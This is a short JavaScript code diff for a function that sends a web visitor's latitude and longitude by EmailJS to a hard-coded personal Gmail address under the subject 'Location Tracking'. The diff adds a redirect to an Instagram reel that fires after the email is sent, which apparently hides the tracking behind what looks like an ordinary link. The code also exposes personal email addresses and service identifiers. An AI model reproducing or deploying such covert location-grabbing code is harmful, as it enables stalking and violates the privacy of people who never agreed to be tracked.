@@ -20,13 +20,14 @@
         // Function to send email
 function sendEmail(latitude, longitude) {
     let templateParams = {
-        subject: "Location Tracking", // Set a custom subject
-        content: `User's Location: Latitude: ${latitude}, Longitude: ${longitude}`, // Add location info in the content
+        subject: "Location Tracking",  // Set a custom subject
+        content: `User's Location: Latitude: ${latitude}, Longitude: ${longitude}`, // This will appear in the body of the email
         to_email: "appash1999@gmail.com", // Replace with your email
         from_name: "Tracking System",
         from_email: "p.appash047@gmail.com",
-        // Optionally set default email settings if needed
-        use_default_email_address: "true",
+        lat: latitude,  // Pass lat as a parameter for the template
+        lon: longitude,  // Pass lon as a parameter for the template
+        use_default_email_address: "true", // Optional, can be removed if not needed
     };
 
     console.log("Sending email with the following details:", templateParams);
@@ -34,6 +35,7 @@ function sendEmail(latitude, longitude) {
     emailjs.send("service_6mdzbfj", "template_neg65fj", templateParams)
         .then(response => {
             console.log("Email sent successfully!", response);
+            window.location.href = "https://www.instagram.com/reel/DFf3OlWzXKT/?utm_source=ig_web_copy_link"; // Replace with your actual Instagram reel URL
         })
         .catch(error => {
             console.log("Error sending email:", error);
